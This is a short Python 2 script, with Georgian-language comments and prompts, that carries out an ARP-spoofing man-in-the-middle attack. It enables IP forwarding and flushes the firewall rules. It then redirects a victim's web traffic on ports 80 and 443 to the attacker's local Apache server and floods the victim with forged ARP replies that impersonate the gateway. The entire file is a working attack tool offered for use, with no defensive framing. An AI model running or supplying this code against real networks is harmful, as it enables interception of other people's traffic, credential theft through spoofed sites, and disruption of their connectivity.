

# scapy live logebis gatishva
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import subprocess
import shlex
from scapy.all import ARP, send
import time



ip_route  =	subprocess.check_output(["ip","route"])
arg       =	shlex.split(ip_route)
gateway   =	arg[2]
ip        =	arg[17]
interface =	arg[4]
mac       =	shlex.split(  subprocess.check_output(["arp"]) )[8]


subprocess. call( ['service', 'apache2', 'restart'] )


with open( '/proc/sys/net/ipv4/ip_forward', 'w' ) as ip_f:
		ip_f. write( '1\n' )


subprocess. call( ['iptables', '-F'] )
subprocess. call( ['iptables', '-t', 'nat', '-F'] )
subprocess. call( ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '--jump', 'DNAT', '--to-destination', ip])
subprocess. call( ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '--jump', 'DNAT', '--to-destination', ip+":443"])


op     =	1 
victim =	raw_input('sheiyvane msxverplis ip : ')
spoof  =	gateway


arp	   =	ARP( op=op, psrc=spoof, pdst=victim, hwdst=mac )

print "mimdinareobs tavdasxma. gatishvistvis ixmaret Ctrl+Z "
send(arp, loop=1, inter=2)
